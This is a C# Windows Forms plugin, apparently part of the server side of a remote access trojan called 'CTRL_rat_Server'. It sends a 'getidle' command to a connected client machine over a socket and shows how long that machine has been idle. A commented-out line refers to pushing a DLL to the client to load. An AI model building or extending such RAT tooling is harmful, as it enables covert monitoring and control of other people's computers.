using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using CTRL_rat_Server;
namespace Server_plugin_dll
{
    public partial class idletime : Form
    {
        node client;
        CTRL_rat_Server.Main parent;
        string workerid;
        public idletime(node _client,CTRL_rat_Server.Main _parent)
        {
            client = _client;
            parent = _parent;
            workerid = client.generate_random_id();
            InitializeComponent();
        }
        public void OnMessage(node _client, Dictionary<object, object> response) 
        {
            if (_client.hwid != client.hwid) return;
            if ((string)response["op"] == "retidle") 
            {
                textBox1.Invoke((MethodInvoker)(() =>
                {
                    textBox1.Text = "Idle for " + (string)response["data"] + " Seconds";
                }));
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            string clientdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Client");
            string serverdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Server");
            var g = client.get_or_create_worker_node(workerid);
            //parent.Send_and_load_dll(g, File.ReadAllBytes(Path.Combine(clientdlldir, "test.dll")));
            var payload = new Dictionary<object, object>();
            payload["op"] = "getidle";
            g.Send(g.sock, Encoding.UTF8.GetBytes(g.DictionaryToJson(payload)));
        }
    }
}
